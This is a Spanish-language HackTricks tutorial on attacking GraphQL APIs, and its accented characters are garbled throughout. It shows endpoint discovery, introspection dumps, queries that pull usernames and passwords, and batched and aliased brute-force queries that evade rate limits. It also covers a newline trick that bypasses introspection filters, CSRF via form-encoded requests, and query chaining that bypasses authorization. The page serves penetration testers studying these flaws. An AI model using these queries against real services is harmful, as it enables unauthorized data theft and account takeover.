# GraphQL

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n

GraphQL act√∫a como una alternativa a la API REST. Las API REST requieren que el cliente env√≠e m√∫ltiples solicitudes a diferentes puntos finales de la API para consultar datos de la base de datos del backend. Con GraphQL solo necesitas enviar una solicitud para consultar el backend. Esto es mucho m√°s simple porque no tienes que enviar m√∫ltiples solicitudes a la API, una sola solicitud puede ser utilizada para recopilar toda la informaci√≥n necesaria.

## GraphQL

A medida que surgen nuevas tecnolog√≠as, tambi√©n lo hacen nuevas vulnerabilidades. Por **defecto** GraphQL no implementa **autenticaci√≥n**, esto queda en manos del desarrollador para implementarlo. Esto significa que por defecto GraphQL permite a cualquiera consultarla, cualquier informaci√≥n sensible estar√° disponible para atacantes sin autenticaci√≥n.

Cuando realices tus ataques de fuerza bruta de directorios, aseg√∫rate de agregar las siguientes rutas para verificar instancias de GraphQL.

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Una vez que encuentres una instancia abierta de GraphQL, necesitas saber **qu√© consultas admite**. Esto se puede hacer utilizando el sistema de introspecci√≥n, m√°s detalles se pueden encontrar aqu√≠: [**GraphQL: Un lenguaje de consulta para APIs.**\
A menudo es √∫til pedir a un esquema GraphQL informaci√≥n sobre qu√© consultas admite. GraphQL nos permite hacer esto‚Ä¶](https://graphql.org/learn/introspection/)

### Huella digital

La herramienta [**graphw00f**](https://github.com/dolevf/graphw00f) es capaz de detectar qu√© motor de GraphQL se utiliza en un servidor y luego imprime informaci√≥n √∫til para el auditor de seguridad.

#### Consultas universales <a href="#universal-queries" id="universal-queries"></a>

Si env√≠as `query{__typename}` a cualquier punto final de GraphQL, incluir√° la cadena `{"data": {"__typename": "query"}}` en alg√∫n lugar de su respuesta. Esto se conoce como una consulta universal y es una herramienta √∫til para sondear si una URL corresponde a un servicio de GraphQL.

La consulta funciona porque cada punto final de GraphQL tiene un campo reservado llamado `__typename` que devuelve el tipo del objeto consultado como una cadena.

### Enumeraci√≥n B√°sica

GraphQL generalmente admite **GET**, **POST** (x-www-form-urlencoded) y **POST**(json). Aunque por seguridad se recomienda permitir solo json para prevenir ataques CSRF.

#### Introspecci√≥n

Para utilizar la introspecci√≥n para descubrir informaci√≥n del esquema, consulta el campo `__schema`. Este campo est√° disponible en el tipo ra√≠z de todas las consultas.
```bash
query={__schema{types{name,fields{name}}}}
```
```graphql
{
  __schema {
    types {
      name
  }
}
```
{% endcode %}

Con esta consulta encontrar√°s el nombre de todos los tipos que se est√°n utilizando:

![](<../../.gitbook/assets/image (202).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Con esta consulta puedes extraer todos los tipos, sus campos y sus argumentos (y el tipo de los argumentos). Esto ser√° muy √∫til para saber c√≥mo consultar la base de datos.

![](<../../.gitbook/assets/image (207) (3).png>)

**Errores**

Es interesante saber si los **errores** se van a **mostrar**, ya que aportar√°n **informaci√≥n** √∫til.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Enumerar el Esquema de la Base de Datos mediante Introspecci√≥n**

{% hint style="info" %}
Si la introspecci√≥n est√° habilitada pero la consulta anterior no se ejecuta, intenta eliminar las directivas `onOperation`, `onFragment` y `onField` de la estructura de la consulta.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspecci√≥n en l√≠nea:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
La √∫ltima l√≠nea de c√≥digo es una consulta graphql que volcar√° toda la meta-informaci√≥n de graphql (nombres de objetos, par√°metros, tipos...)

![](<../../.gitbook/assets/image (206).png>)

Si la introspecci√≥n est√° habilitada, puedes usar [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para ver en una GUI todas las opciones.

### Consultas

Ahora que sabemos qu√© tipo de informaci√≥n se guarda dentro de la base de datos, intentemos **extraer algunos valores**.

En la introspecci√≥n puedes encontrar **qu√© objeto puedes consultar directamente** (porque no puedes consultar un objeto solo porque existe). En la siguiente imagen puedes ver que el "_queryType_" se llama "_Query_" y que uno de los campos del objeto "_Query_" es "_flags_", que tambi√©n es un tipo de objeto. Por lo tanto, puedes consultar el objeto flag.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Nota que el tipo de la consulta "_flags_" es "_Flags_", y este objeto se define como a continuaci√≥n:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Puedes ver que los objetos "_Flags_" est√°n compuestos por **name** y **value**. Entonces puedes obtener todos los nombres y valores de las flags con la consulta:
```javascript
query={flags{name, value}}
```
Tenga en cuenta que si el **objeto a consultar** es un **tipo primitivo** como **string**, como en el siguiente ejemplo

![](<../../.gitbook/assets/image (441).png>)

Puede consultarlo simplemente con:
```javascript
query={hiddenFlags}
```
En otro ejemplo donde hab√≠a 2 objetos dentro del objeto "_Query_": "_user_" y "_users_".\
Si estos objetos no necesitan ning√∫n argumento para buscar, podr√≠as **recuperar toda la informaci√≥n de ellos** simplemente **pidiendo** los datos que quieras. En este ejemplo de Internet podr√≠as extraer los nombres de usuario y contrase√±as guardados:

![](<../../.gitbook/assets/image (208).png>)

Sin embargo, en este ejemplo si intentas hacerlo obtienes este **error**:

![](<../../.gitbook/assets/image (210).png>)

Parece que de alguna manera buscar√° utilizando el argumento "_**uid**_" de tipo _**Int**_.\
De todos modos, ya sab√≠amos eso, en la secci√≥n [Enumeraci√≥n B√°sica](graphql.md#basic-enumeration) se propuso una consulta que nos mostraba toda la informaci√≥n necesaria: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Si lees la imagen proporcionada cuando ejecuto esa consulta ver√°s que "_**user**_" ten√≠a el **arg** "_**uid**_" de tipo _Int_.

As√≠ que, realizando un poco de fuerza bruta ligera en _**uid**_ encontr√© que en _**uid**=**1**_ se recuper√≥ un nombre de usuario y una contrase√±a:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Nota que **descubr√≠** que pod√≠a pedir los **par√°metros** "_**user**_" y "_**password**_" porque si intento buscar algo que no existe (`query={user(uid:1){noExists}}`) obtengo este error:

![](<../../.gitbook/assets/image (213).png>)

Y durante la **fase de enumeraci√≥n** descubr√≠ que el objeto "_**dbuser**_" ten√≠a como campos "_**user**_" y "_**password**_".

**Truco de volcado de cadena de consulta (gracias a @BinaryShadow\_)**

Si puedes buscar por un tipo de cadena, como: `query={theusers(description: ""){username,password}}` y **buscas una cadena vac√≠a** **volcar√° todos los datos**. (_Nota que este ejemplo no est√° relacionado con el ejemplo de los tutoriales, para este ejemplo sup√≥n que puedes buscar usando "**theusers**" por un campo String llamado "**description**"_).

GraphQL es una tecnolog√≠a relativamente nueva que est√° empezando a ganar tracci√≥n entre startups y grandes corporaciones. Adem√°s de la falta de autenticaci√≥n por defecto, los puntos finales de GraphQL pueden ser vulnerables a otros errores como IDOR.

### B√∫squeda

Para este ejemplo imagina una base de datos con **personas** identificadas por el correo electr√≥nico y el nombre y **pel√≠culas** identificadas por el nombre y la calificaci√≥n. Una **persona** puede ser **amiga** de otras **personas** y una persona puede **tener pel√≠culas**.

Puedes **buscar** personas **por** el **nombre** y obtener sus correos electr√≥nicos:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puedes **buscar** personas **por** el **nombre** y obtener sus **pel√≠culas** **suscritas**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Tenga en cuenta c√≥mo se indica recuperar el `name` de los `subscribedMovies` de la persona.

Tambi√©n puede **buscar varios objetos al mismo tiempo**. En este caso, se realiza una b√∫squeda de 2 pel√≠culas:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
O incluso **relaciones de varios objetos diferentes utilizando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutaciones

**Las mutaciones se utilizan para realizar cambios en el lado del servidor.**

En la **introspecci√≥n** puedes encontrar las **mutaciones** **declaradas**. En la siguiente imagen, el "_MutationType_" se llama "_Mutation_" y el objeto "_Mutation_" contiene los nombres de las mutaciones (como "_addPerson_" en este caso):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Para este ejemplo, imagina una base de datos con **personas** identificadas por el correo electr√≥nico y el nombre, y **pel√≠culas** identificadas por el nombre y la calificaci√≥n. Una **persona** puede ser **amiga** de otras **personas** y una persona puede **tener pel√≠culas**.

Una mutaci√≥n para **crear nuevas** pel√≠culas dentro de la base de datos puede ser como la siguiente (en este ejemplo la mutaci√≥n se llama `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observe c√≥mo tanto los valores como el tipo de datos est√°n indicados en la consulta.**

Tambi√©n puede haber una **mutaci√≥n** para **crear** **personas** (denominada `addPerson` en este ejemplo) con amigos y pel√≠culas (note que los amigos y pel√≠culas deben existir antes de crear una persona relacionada con ellos):
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Fuerza bruta por lotes en 1 solicitud API

Esta informaci√≥n fue tomada de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticaci√≥n a trav√©s de la API GraphQL con **env√≠o simult√°neo de muchas consultas con diferentes credenciales** para verificarla. Es un ataque de fuerza bruta cl√°sico, pero ahora es posible enviar m√°s de un par de usuario/contrase√±a por solicitud HTTP debido a la caracter√≠stica de lotes de GraphQL. Este enfoque enga√±ar√≠a a las aplicaciones de monitoreo de tasa externa haci√©ndoles creer que todo est√° bien y que no hay un bot intentando adivinar contrase√±as.

A continuaci√≥n, puedes encontrar la demostraci√≥n m√°s simple de una solicitud de autenticaci√≥n de aplicaci√≥n, con **3 pares de correo electr√≥nico/contrase√±a diferentes a la vez**. Obviamente, es posible enviar miles en una sola solicitud de la misma manera:

![](<../../.gitbook/assets/image (182) (1).png>)

Como podemos ver en la captura de respuesta, las primeras y terceras solicitudes devolvieron _null_ y reflejaron la informaci√≥n correspondiente en la secci√≥n de _error_. La **segunda mutaci√≥n ten√≠a los datos de autenticaci√≥n correctos** y la respuesta tiene el token de sesi√≥n de autenticaci√≥n correcto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sin Introspecci√≥n

Cada vez m√°s **puntos finales de graphql est√°n desactivando la introspecci√≥n**. Sin embargo, los errores que graphql arroja cuando recibe una solicitud inesperada son suficientes para que herramientas como [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) puedan recrear la mayor parte del esquema.

Adem√°s, la extensi√≥n de Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observa las solicitudes de la API GraphQL que pasan por Burp** y **construye** un esquema GraphQL interno con cada nueva consulta que ve. Tambi√©n puede exponer el esquema para GraphiQL y Voyager. La extensi√≥n devuelve una respuesta falsa cuando recibe una consulta de introspecci√≥n. Como resultado, GraphQuail muestra todas las consultas, argumentos y campos disponibles para su uso dentro de la API. Para m√°s informaci√≥n [**consulta esto**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Una buena **lista de palabras** para descubrir [**entidades GraphQL se puede encontrar aqu√≠**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Eludiendo las defensas de introspecci√≥n de GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Si no puedes hacer que las consultas de introspecci√≥n se ejecuten para la API que est√°s probando, intenta insertar un **car√°cter especial despu√©s de la palabra clave `__schema`**.

Cuando los desarrolladores desactivan la introspecci√≥n, podr√≠an usar una expresi√≥n regular para excluir la palabra clave `__schema` en las consultas. Deber√≠as probar caracteres como **espacios**, **nuevas l√≠neas** y **comas**, ya que son **ignorados** por GraphQL pero no por expresiones regulares defectuosas.

Como tal, si el desarrollador solo ha excluido `__schema{`, entonces la siguiente consulta de introspecci√≥n no ser√≠a excluida.
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
Si esto no funciona, intente ejecutar la sonda sobre un m√©todo de solicitud alternativo, ya que la introspecci√≥n solo puede estar deshabilitada para POST. Pruebe una solicitud GET o una solicitud POST con un tipo de contenido de `x-www-form-urlencoded`.

### Estructuras GraphQL Filtradas

Si la introspecci√≥n est√° deshabilitada, intente mirar el c√≥digo fuente del sitio web. Las consultas a menudo se cargan previamente en el navegador como bibliotecas de javascript. Estas consultas preescritas pueden revelar informaci√≥n valiosa sobre el esquema y el uso de cada objeto y funci√≥n. La pesta√±a `Sources` de las herramientas para desarrolladores puede buscar en todos los archivos para enumerar d√≥nde se guardan las consultas. A veces, incluso las consultas protegidas por el administrador ya est√°n expuestas.
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF en GraphQL

Si no sabes qu√© es CSRF, lee la siguiente p√°gina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Encontrar√°s varios puntos finales de GraphQL **configurados sin tokens de CSRF.**

Ten en cuenta que las solicitudes de GraphQL generalmente se env√≠an a trav√©s de peticiones POST utilizando el Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Sin embargo, la mayor√≠a de los puntos finales de GraphQL tambi√©n admiten **`form-urlencoded` solicitudes POST:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Por lo tanto, como las solicitudes CSRF como las anteriores se env√≠an **sin solicitudes de preflight**, es posible **realizar** **cambios** en el GraphQL abusando de un CSRF.

Sin embargo, ten en cuenta que el nuevo valor predeterminado de la cookie para la bandera `samesite` de Chrome es `Lax`. Esto significa que la cookie solo se enviar√° desde una web de terceros en solicitudes GET.

Ten en cuenta que generalmente es posible enviar la **solicitud** **de consulta** tambi√©n como una **solicitud GET y el token CSRF podr√≠a no estar validado en una solicitud GET.**

Adem√°s, abusando de un **ataque** [**XS-Search**](../../pentesting-web/xs-search.md) podr√≠a ser posible exfiltrar contenido del punto final de GraphQL abusando de las credenciales del usuario.

Para m√°s informaci√≥n **consulta la** [**publicaci√≥n original aqu√≠**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizaci√≥n en GraphQL

Muchas funciones de GraphQL definidas en el punto final solo podr√≠an verificar la autenticaci√≥n del solicitante, pero no la autorizaci√≥n.

Modificar las variables de entrada de la consulta podr√≠a llevar a que se [filtren](https://hackerone.com/reports/792927) detalles sensibles de la cuenta.

La mutaci√≥n incluso podr√≠a llevar a la toma de control de la cuenta intentando modificar otros datos de la cuenta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Eludir la autorizaci√≥n en GraphQL

[Encadenar consultas](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) juntas puede eludir un sistema de autenticaci√≥n d√©bil.

En el siguiente ejemplo, puedes ver que la operaci√≥n es "forgotPassword" y que solo deber√≠a ejecutar la consulta forgotPassword asociada con ella. Esto se puede eludir agregando una consulta al final, en este caso agregamos "register" y una variable de usuario para que el sistema registre a un nuevo usuario.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Eludir el l√≠mite de tasa usando alias

Normalmente, los objetos GraphQL no pueden contener m√∫ltiples propiedades con el mismo nombre. Los alias te permiten eludir esta restricci√≥n **nombrando expl√≠citamente las propiedades que deseas** que la API devuelva. Puedes usar alias para devolver **m√∫ltiples instancias del mismo** tipo de objeto en una sola solicitud.

Para obtener m√°s informaci√≥n sobre los alias de GraphQL, consulta [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Aunque los alias est√°n destinados a limitar la cantidad de llamadas a la API que necesitas hacer, tambi√©n se pueden usar para forzar bruscamente un punto final de GraphQL.

Muchos puntos finales tendr√°n alg√∫n tipo de **limitador de tasa en su lugar para prevenir ataques de fuerza bruta**. Algunos limitadores de tasa funcionan en base al **n√∫mero de solicitudes HTTP** recibidas en lugar del n√∫mero de operaciones realizadas en el punto final. Debido a que los alias efectivamente te permiten enviar m√∫ltiples consultas en un solo mensaje HTTP, pueden eludir esta restricci√≥n.

El ejemplo simplificado a continuaci√≥n muestra una serie de **consultas con alias que verifican si los c√≥digos de descuento de una tienda son v√°lidos**. Esta operaci√≥n podr√≠a potencialmente eludir la limitaci√≥n de tasa ya que es una sola solicitud HTTP, aunque podr√≠a usarse para verificar un gran n√∫mero de c√≥digos de descuento a la vez.
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Herramientas

### Esc√°neres de vulnerabilidades

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Kit de herramientas que se puede utilizar para capturar esquemas y buscar datos sensibles, probar la autorizaci√≥n, fuerza bruta en esquemas y encontrar caminos hacia un tipo dado.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Se puede utilizar como independiente o [extensi√≥n de Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Se puede utilizar como cliente CLI tambi√©n para automatizar ataques.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Herramienta que enumera las diferentes formas de alcanzar un tipo dado en un esquema GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extensi√≥n de Burp para pruebas avanzadas de GraphQL. El _**Scanner**_ es el n√∫cleo de InQL v5.0, donde puedes analizar un punto final de GraphQL o un archivo de esquema de introspecci√≥n local. Genera autom√°ticamente todas las posibles consultas y mutaciones, organiz√°ndolas en una vista estructurada para tu an√°lisis. El componente _**Attacker**_ te permite ejecutar ataques GraphQL por lotes, lo cual puede ser √∫til para eludir l√≠mites de tasa implementados de manera deficiente.

### Clientes

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Cliente GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Cliente GUI

### Pruebas Autom√°ticas

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video explicando AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referencias

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
